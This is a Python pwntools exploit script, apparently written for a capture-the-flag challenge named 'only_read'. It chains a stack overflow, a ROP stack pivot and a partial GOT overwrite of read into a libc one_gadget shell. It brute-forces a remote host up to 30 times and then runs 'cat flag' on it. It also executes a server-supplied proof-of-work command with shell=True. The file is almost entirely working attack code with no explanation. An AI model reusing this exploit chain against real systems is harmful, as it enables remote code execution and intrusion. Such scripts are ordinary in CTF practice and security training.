from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]
context.timeout = 3

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./only_read"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

def getio():
    if not f_remote:
        io = process([vuln_path])
        # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
    else:
        # io = remote("192.168.2.126", 9999)
        io = remote("1.95.129.168", 9999)

    return io


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

def pwn(io):
    """ 
    0x0000000000110a46 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret 
    0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x000000000040111d : pop rbp ; ret
    """
    if "pow" in sys.argv:
        io.recvuntil(b"Submit the token generated by `")
        cmd = io.recvuntil(b"`", drop=True).decode()
        token = subprocess.check_output(cmd, shell=True).strip()
        io.sendline(token)

    log.success("libc_read:-----> " + hex(libc.symbols["read"]))
    bss = 0x0404000+0x100
    main_read = 0x0401142 
    got_read = elf.got["read"] #0x404000
    magic_addr = 0x40111c
    pop_rbp_ret = 0x40111d
    
    payload = b"a"*0x80
    payload += p64(bss)
    payload += p64(main_read)
    
    ddebug()
    
    if "pow" in sys.argv:
        io.sendlineafter("challenge", payload)
    else:
        io.sendline(payload)
    
    payload = p64(0)
    payload += p64(elf.plt["read"])  # 改写过后的110a46
    payload += p64(0xfffdeae5)  # gai rbx
    payload += p64(got_read+0x3d)  # gai rbp  +0x3d
    payload += p64(0) * 3
    
    payload += p64(magic_addr) 
    payload += p64(pop_rbp_ret)
    payload += p64(0x404080)
    payload += p64(elf.plt["read"])  # one_gadget
    
    payload = payload.ljust(0x80, b"\x00")
    payload += p64(got_read+0x80)
    payload += p64(main_read)
    
    io.sendline(payload)
   
    pause() if f_gdb else sleep(1)
    
    payload = b"\x46\x3a"
    io.send(payload)
    
    pause() if f_gdb else sleep(1)
    # io.interactive()
    io.sendline("cat flag")
    sleep(1)
    recv_data = io.recvall()
    log.hexdump(recv_data)
    if b"{" in recv_data:
        print(recv_data)
        return 1

    return 0
loop=True
for i in range(30):
    if not loop:
        break
    print(f"-----------{i}-------------")
    try:
        io=getio()
        if pwn(io):
            loop=False
    except:
        pass


"""
0xef4ce execve("/bin/sh", rbp-0x50, r12)
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])

0x110a46 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret

"""
